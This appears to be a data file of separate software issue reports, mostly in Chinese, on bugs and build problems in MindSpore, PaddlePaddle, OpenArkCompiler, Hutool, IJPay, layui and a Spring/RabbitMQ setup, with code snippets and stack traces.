在使用梯度裁剪跑训练时 报错如下,"梯度裁剪过程如下： 报错如下： mindspore版本：1.5   <code>: 38 def construct(self, *args): 39 weights = self.weights 40 loss = self.network(*args) 41 sens = P.Fill()(P.DType()(loss), P.Shape()(loss), self.sens) 42 grads = self.grad(self.network, weights)(*args, sens) 43 if self.reducer_flag: 44 # apply grad reducer on grads 45 grads = self.grad_reducer(grads) 46 if self.use_global_norm: 47 grads = self.hyper_map(F.partial(grad_scale, F.scalar_to_array(self.sens)), grads) 48 grads = C.clip_by_global_norm(grads) 49 self.optimizer(grads) 50 return loss"
dex2mpl: issues to compile .jar/.dex files of OpenJDK,"Trying to use dex2mpl for OpenJDK build, I followed the steps of Android build which uses d8 to generate .dex file from .jar file, and then use dex2mpl to generate .mpl and .mplt files. The steps for generating libcore-all.mpl and libcore-all.mplt are like this in Android build: Following the steps above, I tried to use d8 to compile 4 .jar files of OpenJDK: The above d8 command created 4 classes*.dex successfully without any error. But When I tried using dex2mpl to compile .dex files with the following command, it printed thousands of ""Warn 20: static field XXX is not found"" messages: Is there any special step or option needed in building OpenJDK to generate .jar files? Or any option or other information/files needed when compiling .jar and .dex files of OpenJDK?   <code>: $ ~/OpenArkCompiler/build/d8 --min-api 39 --output . ~/OpenArkCompiler/libjava-core/java-core.jar $ mv classes.dex libcore-all.dex $ ~/OpenArkCompiler/output/bin/dex2mpl -j100 libcore-all.dex $ cd openjdk/ $ ls charsets.jar jce.jar jsse.jar rt.jar $ ~/OpenArkCompiler/build/d8 --min-api 39 charsets.jar jce.jar jsse.jar rt.jar $ ls charsets.jar classes2.dex classes3.dex classes4.dex classes.dex jce.jar jsse.jar rt.jar $ ~/OpenArkCompiler/output/bin/dex2mpl -j100 classes.dex classes2.dex classes3.dex classes4.dex Warn 20: static field Ljava_2Futil_2Flogging_2FLevel_3B_7CFINE_7CLjava_2Futil_2Flogging_2FLevel_3B is not found Warn 20: static field Ljava_2Flang_2FSystem_3B_7Cout_7CLjava_2Fio_2FPrintStream_3B is not found Warn 20: static field Ljava_2Futil_2FLocale_3B_7CENGLISH_7CLjava_2Futil_2FLocale_3B is not found Warn 20: static field Ljava_2Flang_2FBoolean_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FCharacter_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FByte_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FShort_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FInteger_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FLong_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FFloat_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FDouble_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FVoid_3B_7CTYPE_7CLjava_2Flang_2FClass_3B is not found Warn 20: static field Ljava_2Flang_2FSystem_3B_7Cerr_7CLjava_2Fio_2FPrintStream_3B is not found Warn 20: static field Ljava_2Flang_2FSystem_3B_7Cin_7CLjava_2Fio_2FInputStream_3B is not found Warn 20: static field Lorg_2Fomg_2FCORBA_2FTCKind_3B_7Ctk__any_7CLorg_2Fomg_2FCORBA_2FTCKind_3B is not found …"
Page类的一个小bug,"com.thinkgem.jeesite.common.persistence.Page&gt; Page类第107行的no参数 原代码无funcName的设置 //分页函数没有明显的写入代码   <code>: public Page(HttpServletRequest request, HttpServletResponse response, int defaultPageSize){ // 设置页码参数（传递repage参数，来记住页码） String no = request.getParameter(""pageNo""); if (StringUtils.isNumeric(no)){ CookieUtils.setCookie(response, ""pageNo"", no); this.setPageNo(Integer.parseInt(no)); }else if (request.getParameter(""repage"")!=null){ no = CookieUtils.getCookie(request, ""pageNo""); if (StringUtils.isNumeric(no)){ this.setPageNo(Integer.parseInt(no)); } } // 设置页面大小参数（传递repage参数，来记住页码大小） String size = request.getParameter(""pageSize""); if (StringUtils.isNumeric(size)){ CookieUtils.setCookie(response, ""pageSize"", size); this.setPageSize(Integer.parseInt(size)); }else if (request.getParameter(""repage"")!=null){ no= CookieUtils.getCookie(request, ""pageSize""); //-----------这里得代码有问题，应该no是size----------- if (StringUtils.isNumeric(size)){ this.setPageSize(Integer.parseInt(size)); } }else if (defaultPageSize != -2){ this.pageSize = defaultPageSize; } // 设置页面分页函数 String funcName = request.getParameter(""funcName""); if (StringUtils.isNotBlank(funcName)){ CookieUtils.setCookie(response, ""funcName"", funcName); this.setFuncName(funcName); }else if (request.getParameter(""repage"")!=null){ funcName = CookieUtils.getCookie(request, ""funcName""); if (StringUtils.isNotBlank(funcName)){ this.setFuncName(funcName); } } // 设置排序参数 String orderBy = request.getParameter(""orderBy""); if (StringUtils.isNotBlank(orderBy)){ this.setOrderBy(orderBy); } }"
请问topk接口如何设置动态变化的k值？,"PaddlePaddle 1.4.1 Python 3.5 Ubuntu 16.04 问题 我项目中需要统计有意义的标签的数据，然后再求topk 的，但是topk的k值好像不能设置变量，如下代码，我该如何操作？   <code>: def cls_ohem2(label): # 真实标签对应的概率 zeros = np.zeros_like(label, dtype=np.float32) ones = np.ones_like(label, dtype=np.float32) # 统计neg和pos的数量 valid_inds = np.where(label &lt; zeros, zeros, ones) num_valid = np.sum(valid_inds) # 选取70%的数据 num_keep_radio = 0.7 keep_num = np.array(num_valid * num_keep_radio).astype(np.int32) print(keep_num) return keep_num keep_num = create_tmp_var(name='keep_num', dtype='int32', shape=[1]) keep_num = fluid.layers.py_func(func=cls_ohem2, x=[label], out=[keep_num]) keep_num = fluid.layers.cast(keep_num, dtype='float32') loss, _ = fluid.layers.topk(input=loss, k=keep_num) loss = fluid.layers.reduce_mean(loss)"
文档中的服务降级问题,http://doc.ruoyi.vip/ruoyi-cloud/cloud/gateway.html#%E7%86%94%E6%96%AD%E9%99%8D%E7%BA%A7 文档中，描述的熔断降级，第一次生效了，但是刷新2次，以后，没有进行熔断降级，还是能够正常访问。 配置都正确 降级配置 第一次操作成功，确实降级了，但是刷新后，又能正常访问了，是不是网关本身有什么bug   <code>: - name: Hystrix args: name: default # 降级接口的地址 fallbackUri: 'forward:/fallback'
enable merge grad unit test,"add finish job at neutral network to convert mkldnn weight to the paddle format. fix bug. if output has cpu layer, mkldnn layer should clear the grad. add branch unit test of conv is for test cases that can surly use internal format.   <code>: mkldnn_branches_xxx_32c.conf"
JSONUtil.toJsonStr(Object obj) 基本类型的封装类结果不对,JDK版本： jdk1.8 hutool版本： 5.6.6，在5.8.3中也发现了相同问题 预期：打印结果为 12332 结果：打印结果为 {}   <code>: Integer i = 12332; String s = JSONUtil.toJsonStr(i); System.out.println(s);
【MindSpore开源活动】开发 UnsortedSegmentMax、UnsortedSegmentMin、UnsortedSegmentProd 算子,"需求 开发 UnsortedSegmentMax、UnsortedSegmentMin、UnsortedSegmentProd 算子. 需要支持的数据类型：与 Ascend 上已有同名算子一致，可参考： ./mindspore/ops/_op_impl/tbe/unsorted_segment_max.py ./mindspore/ops/_op_impl/tbe/unsorted_segment_min.py ./mindspore/ops/_op_impl/tbe/unsorted_segment_prod.py 硬件平台：CPU 对标：tf.math.unsorted_segment_max、tf.math.unsorted_segment_min、tf.raw_ops.UnsortedSegmentProd 精度要求 float16: loss=0.001 float32: loss=0.0001 任务分值 60分 参考用例 参考如下测试方法，完成对所有功能、所有数据类型场景的测试。   <code>: class UnsortedSegmentMax(Cell): def __init__(self, num_segments): super().__init__() self.op = op.UnsortedSegmentMax() self.num_segments = num_segments def construct(self, inputs, segment_ids): return self.op(inputs, segment_ids, self.num_segments) class UnsortedSegmentMaxFactory(OpsFactory): def __init__(self, input_shape, segment_ids, num_segments, dtype1=np.float32, dtype2=np.int32): super().__init__(dtype=dtype1) self.input_np = np.random.randn(*input_shape).astype(dtype=dtype1) self.segment_ids = np.array(segment_ids).astype(dtype2) self.num_segments = num_segments self.out_grad_np = None self.dtype1 = dtype1 self.dtype2 = dtype2 def forward_mindspore_impl(self): inputs = Tensor(self.input_np) segments = Tensor(self.segment_ids) net = UnsortedSegmentMax(self.num_segments) out = net(inputs, segments) return out.asnumpy() def forward_tensorflow_impl(self): x = tf.Variable(self.input_np) with tf.compat.v1.Session() as sess: sess.run(tf.compat.v1.global_variables_initializer()) out = sess.run(tf.math.unsorted_segment_max(x, self.segment_ids, self.num_segments)) return out.astype(self.dtype1) def grad_mindspore_impl(self): inputs = Tensor(self.input_np) segments = Tensor(self.segment_ids) out_grad = Tensor(self.out_grad_np) net = UnsortedSegmentMax(self.num_segments) grad_net = GradOfFirstInput(net) grad_net.set_train() input_grad = grad_net(inputs, segments, out_grad) return input_grad.asnumpy() def grad_tensorflow_impl(self): x = tf.Variable(self.input_np) segments = tf.constant(self.segment_ids) self.out_grad_np = np.random.randn(*self.forward_tensorflow_impl().shape).astype( self.dtype1 ) net = tf.math.unsorted_segment_max(x, segments, self.num_segments) train_net = tf.gradients(ys=net, xs=[x], grad_ys=self.out_grad_np) with tf.compat.v1.Session() as sess: sess.run(tf.compat.v1.global_variables_initializer()) out_tf = sess.run(train_net) return out_tf[0] def forward_cmp(self): out_standard = self.forward_tensorflow_impl() out_mindspore = self.forward_mindspore_impl() allclose_nparray(out_standard, out_mindspore, self.loss, self.loss) def grad_cmp(self): out_grad_tensorflow = self.grad_tensorflow_impl() out_grad_mindspore = self.grad_mindspore_impl() allclose_nparray(out_grad_tensorflow, out_grad_mindspore, self.loss, self.loss)"
CCJSqlParserUtil不支持中文,"可能在SQL表达式过程中，select product as 产品 from t_product，但现阶段CCJSqlParserUtil并不支持中文， 出现异常情况   <code>: Statements result = CCJSqlParserUtil.parseStatements(""select a.product as 产品 from t_product a where a.prnoductid = 123"") org.tinygroup.jsqlparser.parser.TokenMgrError: Lexical error at line 1, column 1. Encountered: ""\u6211"" (25105), after : """""
[ST][NET][wide&deep/tinybert/bert][GPU]network train failed,"wide&amp;deep/tinybert/bert网络在GPU环境训练失败 / 硬件环境: /device GPU : -- MindSpore version :r1.8.0 commit_id:5afb7c9d -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_wide_deep_criteo_train_infer_gpu_8p_0001.py test_ms_wide_deep_criteo_train_check_perf_gpu_1p_0001.py test_bert_large_cn_news_train_check_perf_gpu_1p_0002.py test_bert_base_cn_news_train_check_loss_gpu_8p_0002.py test_ms_model_zoo_tinybert_gd_check_loss_8p_gpu.py cd solution_test/cases/02network/02nlp/bert/train pytest -s test_bert_large_cn_news_train_check_perf_gpu_1p_0002.py 网络训练成功 走给夏睿杰   <code>: TVMError: Check failed: !var_idmap_.count(v): Need input to be in SSA form dup T_multiply_T_multiply_T_add_T_multiply_T_multiply_input_0_input_1_input_3_input_5_T_cast_T_less_equal_input_8 multiprocessing.pool.RemoteTraceback: """""" Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/pool.py"", line 121, in worker result = (True, func(*args, **kwds)) File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/pool.py"", line 47, in starmapstar return list(itertools.starmap(args[0], args[1])) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/akg_compiler/akg_process.py"", line 40, in _compile_akg_task_default raise ValueError(""Compile error, args: {}! build attrs: {}"".format(json_str, attrs)) ValueError: Compile error, args: {""composite"":true,""composite_graph"":""6813.6813"",""compute_capability"":""7.0"",""id"":0,""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[4096,1024],""tensor_name"":""input_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[4096,1],""tensor_name"":""input_1""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_5""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_3""}]],""op"":""Fused_Mul_Mul_Add_Reshape_split_2640004505126245655"",""op_desc"":[{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[4096,1024],""tensor_name"":""input_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[4096,1],""tensor_name"":""input_1""}]],""name"":""Mul"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[4096,1024],""tensor_name"":""output_0_0""}]},{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[4096,1024],""tensor_name"":""output_0_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[1024],""tensor_name"":""input_3""}]],""name"":""Mul"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[4096,1024],""tensor_name"":""output_0_1""}]},{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[4096,1024],""tensor_name"":""output_0_1""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[1024],""tensor_name"":""input_5""}]],""name"":""Add"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[4096,1024],""tensor_name"":""output_0_2""}]},{""attr"":[{""data_type"":""listInt"",""name"":""shape"",""value"":[32,128,1024]}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[4096,1024],""tensor_name"":""output_0_2""}]],""name"":""Reshape"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,128,1024],""tensor_name"":""output_0_3""}]}],""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,128,1024],""tensor_name"":""output_0_3""},{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[4096,1024],""tensor_name"":""output_0_2""}],""platform"":""AKG"",""process"":""cuda""}! build attrs: None """""" The above exception was the direct cause of the following exception: Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server_akg.py"", line 55, in &lt;module&gt; messager.run() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server.py"", line 106, in run self.loop() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server.py"", line 103, in loop self.handle() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server_akg.py"", line 39, in handle self.akg_builder.handle(self, arg) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server.py"", line 167, in handle res = self.compile() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server.py"", line 144, in compile return self.akg_processor.compile(self.attrs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/akg_compiler/akg_process.py"", line 114, in compile res.get(timeout=self.wait_time) File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/pool.py"", line 657, in get raise self._value ValueError: Compile error, args: {""composite"":true,""composite_graph"":""6813.6813"",""compute_capability"":""7.0"",""id"":0,""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[4096,1024],""tensor_name"":""input_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[4096,1],""tensor_name"":""input_1""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_5""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_3""}]],""op"":""Fused_Mul_Mul_Add_Reshape_split_2640004505126245655"",""op_desc"":[{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[4096,1024],""tensor_name"":""input_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[4096,1],""tensor_name"":""input_1""}]],""name"":""Mul"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[4096,1024],""tensor_name"":""output_0_0""}]},{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[4096,1024],""tensor_name"":""output_0_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[1024],""tensor_name"":""input_3""}]],""name"":""Mul"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[4096,1024],""tensor_name"":""output_0_1""}]},{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[4096,1024],""tensor_name"":""output_0_1""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[1024],""tensor_name"":""input_5""}]],""name"":""Add"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[4096,1024],""tensor_name"":""output_0_2""}]},{""attr"":[{""data_type"":""listInt"",""name"":""shape"",""value"":[32,128,1024]}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[4096,1024],""tensor_name"":""output_0_2""}]],""name"":""Reshape"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,128,1024],""tensor_name"":""output_0_3""}]}],""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,128,1024],""tensor_name"":""output_0_3""},{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[4096,1024],""tensor_name"":""output_0_2""}],""platform"":""AKG"",""process"":""cuda""}! build attrs: None [CRITICAL] SESSION(18488,7f34b189c740,python):2022-05-31-00:20:43.198.659 [mindspore/ccsrc/backend/common/session/kernel_build_client.h:111] Response] Response is empty origin dataset size: 1000 [WARNING] MD(18488,7f34b189c740,python):2022-05-31-00:20:43.954.980 [mindspore/ccsrc/minddata/dataset/engine/datasetops/device_queue_op.cc:73] ~DeviceQueueOp] preprocess_batch: 3; batch_queue: 0, 11, 16, 15, 16, 15, 16; push_start_time: 2022-05-31-00:19:43.253.375, 2022-05-31-00:19:43.253.712, 2022-05-31-00:19:43.253.769; push_end_time: 2022-05-31-00:19:43.253.694, 2022-05-31-00:19:43.253.762, 2022-05-31-00:20:43.951.641. Traceback (most recent call last): File ""run_pretrain.py"", line 271, in &lt;module&gt; run_pretrain() File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/bert/train/test_ms_bert_large_cn_news_train_check_perf_gpu_1p_0002/src/model_utils/moxing_adapter.py"", line 109, in wrapped_func run_func(*args, **kwargs) File ""run_pretrain.py"", line 266, in run_pretrain dataset_sink_mode=(cfg.enable_data_sink == ""true""), sink_size=cfg.data_sink_steps) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 920, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 89, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 565, in _train cb_params, sink_size, initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 636, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 572, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 951, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 924, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1086, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: mindspore/ccsrc/backend/common/session/kernel_build_client.h:111 Response] Response is empty"
Paddle TensorRT 编译方法,"Paddle Repo 中的 inference api 测试如何编译并执行？ Inference API的编译方法参考官方文档，如果需要额外编译 inference API 单测部分，需要修改cmake编译参数如下： Paddle TensorRT 如何复现官网文档给出的结果? 请确保复现环境与官网给出的保持一致： 编译参数也与官网给出的保持一致：   <code>: cmake -DFLUID_INFERENCE_INSTALL_DIR=$PADDLE_ROOT \ -DCMAKE_BUILD_TYPE=Release \ -DWITH_FLUID_ONLY=ON \ -DWITH_SWIG_PY=OFF \ -DWITH_PYTHON=OFF \ -DWITH_MKL=OFF \ -DWITH_GPU=OFF \ -DON_INFER=ON \ -DWITH_INFERENCE_API_TEST=ON \ .. CPU:Intel(R) Xeon(R) Gold 5117 CPU @ 2.00GHz GPU:Tesla P4 TensorRT4.0, CUDA8.0, CUDNNV7 测试模型 ResNet50，MobileNet，ResNet101, Inception V3. cmake -DFLUID_INFERENCE_INSTALL_DIR=$PADDLE_ROOT \ -DCMAKE_BUILD_TYPE=Release \ -DWITH_FLUID_ONLY=ON \ -DWITH_SWIG_PY=OFF \ -DWITH_PYTHON=OFF \ -DWITH_MKL=OFF \ -DWITH_GPU=OFF \ -DON_INFER=ON \ -DWITH_INFERENCE_API_TEST=ON \ .."
Check num_worker value in the base class of DatasetNode::ValidateParam(),"This check is added to prevent core dump. Today, the code below would core dump due to lack of checking its value within validate param   <code>: std::string folder_path = datasets_root_path_ + ""/testPK/data/""; std::shared_ptr&lt;Dataset&gt; ds = ImageFolder(folder_path); ds-&gt;SetNumWorkers(-1)-&gt;CreateIterator()"
"麻烦新增V3接口app支付和小程序支付,支付签名的代码","IJPay 版本:2.6.2 支付方式:合单支付 调用的接口:https://pay.weixin.qq.com/wiki/doc/apiv3/wxpay/pay/combine/chapter3_5.shtml if (PayTypeEnum.APP.getPayType() == payType) { //APP 支付-预付订单再次签名 Map&lt;String, String&gt; packageParams = new HashMap&lt;&gt;(6); String timeStamp = String.valueOf(System.currentTimeMillis() / 1000); String nonceStr = String.valueOf(System.currentTimeMillis());   <code>: ArrayList&lt;String&gt; arrayList = new ArrayList&lt;&gt;(); arrayList.add(combineAppid); arrayList.add(timeStamp); arrayList.add(nonceStr); arrayList.add(prepayId); String buildSignMessage = PayKit.buildSignMessage(arrayList); String packageSign = PayKit.createSign(buildSignMessage, wxPayV3Config.getKeyPath()); packageParams.put(""appId"", combineAppid); packageParams.put(""partnerid"", wxPayV3Config.getCombineMchid()); packageParams.put(""prepayid"", prepayId); packageParams.put(""package"", ""Sign=WXPay""); packageParams.put(""timeStamp"", timeStamp); packageParams.put(""nonceStr"", nonceStr); packageParams.put(""signType"", ""RSA""); packageParams.put(""paySign"", packageSign); return packageParams; } else if (PayTypeEnum.JSAPI_APPLET.getPayType() == payType) { //小程序-预付订单再次签名 Map&lt;String, String&gt; packageParams = new HashMap&lt;&gt;(6); String timeStamp = String.valueOf(System.currentTimeMillis() / 1000); String nonceStr = String.valueOf(System.currentTimeMillis()); String packageStr = ""prepay_id="" + prepayId; ArrayList&lt;String&gt; arrayList = new ArrayList&lt;&gt;(); arrayList.add(combineAppid); arrayList.add(timeStamp); arrayList.add(nonceStr); arrayList.add(packageStr); String buildSignMessage = PayKit.buildSignMessage(arrayList); String packageSign = PayKit.createSign(buildSignMessage, wxPayV3Config.getKeyPath()); packageParams.put(""appId"", combineAppid); packageParams.put(""timeStamp"", timeStamp); packageParams.put(""nonceStr"", nonceStr); packageParams.put(""package"", packageStr); packageParams.put(""signType"", ""RSA""); packageParams.put(""paySign"", packageSign); return packageParams; }"
Can test program influence the gradient?,"the demo link is test_recognize_digits.py I do not known the test data feeded into test_program will influence the Gradient or not. Is that a bug?   <code>: test_program = fluid.default_main_program().clone() optimizer = fluid.optimizer.Adam(learning_rate=0.001) optimizer.minimize(avg_loss) place = fluid.CUDAPlace(0) if use_cuda else fluid.CPUPlace() exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) train_reader = paddle.batch( paddle.reader.shuffle( paddle.dataset.mnist.train(), buf_size=500), batch_size=BATCH_SIZE) test_reader = paddle.batch( paddle.dataset.mnist.test(), batch_size=BATCH_SIZE) feeder = fluid.DataFeeder(feed_list=[img, label], place=place) PASS_NUM = 100 for pass_id in range(PASS_NUM): for batch_id, data in enumerate(train_reader()): # train a mini-batch, fetch nothing exe.run(feed=feeder.feed(data)) if (batch_id + 1) % 10 == 0: acc_set = [] avg_loss_set = [] for test_data in test_reader(): acc_np, avg_loss_np = exe.run(program=test_program, feed=feeder.feed(test_data), fetch_list=[acc, avg_loss])"
layer最大化后，显示异常,"版本：2.8.0 bate 3 描述：在此处填写尽可能详细的问题描述和具体操作步骤等信息 html js 点击按钮后的效果   <code>: &lt;button type=""button"" class=""layui-btn layui-btn-normal"" id=""test3""&gt;网易&lt;/button&gt; if ($('#test3').length &gt; 0) { $('#test3').on('click', function() { var w = ($(window).width() - 50); var h = ($(window).height() - 50); var url = 'https://www.163.com/'; layer.open({ id: 'layer_test3', type: 2, area: [w + 'px', h + 'px'], maxmin: true, shade: 0.4, title: '网易', content: url }); }); }"
[MS][LITE][master]No error is reported when three backends are configured for old API.,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Context_020 取master最新代码 context同时配置CPU,GPU,NPU 断言用例 老的api接口同时配置CPU,GPU,NPU没有返回异常 不支持同时配置，session初始化失败，应返会nullptr 3 ========CreateSession========== Assertion Failed   <code>: auto context = std::make_shared&lt;mindspore::lite::Context&gt;(); DeviceContext gpu_device_ctx{DT_GPU}; context-&gt;device_list_.push_back(gpu_device_ctx); DeviceContext npu_device_ctx{DT_NPU}; context-&gt;device_list_.push_back(npu_device_ctx); std::cout &lt;&lt; context-&gt;device_list_.size() &lt;&lt; std::endl; printf(""========CreateSession==========\n""); auto session = LiteSession::CreateSession(context.get()); ASSERT_EQ(nullptr, session);"
pigGateway启动时报错RabbitMQ服务连接不上,"我的pigConfig配置如上，这个地址在浏览器中可以正常访问和登陆，但是启动pigGateway就报如下异常不知是何原因。 Exception in thread ""AsyncReporter(RabbitMQSender{encoding=JSON, messageMaxBytes=100000, addresses=[192.168.1.4:15672], queue=zipkin, connectionFactory=com.rabbitmq.client.ConnectionFactory@3aabcb04, encoder=JSON})"" java.lang.IllegalStateException: Unable to establish connection to RabbitMQ server at zipkin2.reporter.amqp.RabbitMQSender.get(RabbitMQSender.java:176) at zipkin2.reporter.amqp.AutoValue_RabbitMQSender.get(AutoValue_RabbitMQSender.java:27) at zipkin2.reporter.amqp.RabbitMQSender1.initialValue(RabbitMQSender.java:197)atzipkin2.reporter.amqp.RabbitMQSender1.initialValue(RabbitMQSender.java:194) at java.lang.ThreadLocal.setInitialValue(ThreadLocal.java:180) at java.lang.ThreadLocal.get(ThreadLocal.java:170) at zipkin2.reporter.amqp.RabbitMQSenderRabbitMQCall.publish(RabbitMQSender.java:217)atzipkin2.reporter.amqp.RabbitMQSenderRabbitMQCall.doExecute(RabbitMQSender.java:212) at zipkin2.reporter.amqp.RabbitMQSenderRabbitMQCall.doExecute(RabbitMQSender.java:204)atzipkin2.reporter.internal.BaseCall.execute(BaseCall.java:39)atzipkin2.reporter.AsyncReporterBoundedAsyncReporter.flush(AsyncReporter.java:254) at zipkin2.reporter.AsyncReporterBuilder.lambdabuild0(AsyncReporter.java:178)atzipkin2.reporter.AsyncReporterBuilder$$Lambda$1.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) Caused by: java.net.ConnectException: Connection timed out: connect at java.net.DualStackPlainSocketImpl.waitForConnect(Native Method) at java.net.DualStackPlainSocketImpl.socketConnect(DualStackPlainSocketImpl.java:85) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:172) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:589) at com.rabbitmq.client.impl.SocketFrameHandlerFactory.create(SocketFrameHandlerFactory.java:50) at com.rabbitmq.client.ConnectionFactory.newConnection(ConnectionFactory.java:907) at com.rabbitmq.client.ConnectionFactory.newConnection(ConnectionFactory.java:859) at com.rabbitmq.client.ConnectionFactory.newConnection(ConnectionFactory.java:736) at zipkin2.reporter.amqp.RabbitMQSender.get(RabbitMQSender.java:174) ... 13 more   <code>: spring: rabbitmq: host: 192.168.1.4 port: 15672 username: mqtest password: 123456 zipkin: rabbitmq: queue: zipkin sleuth: sampler: percentage: 1.0"
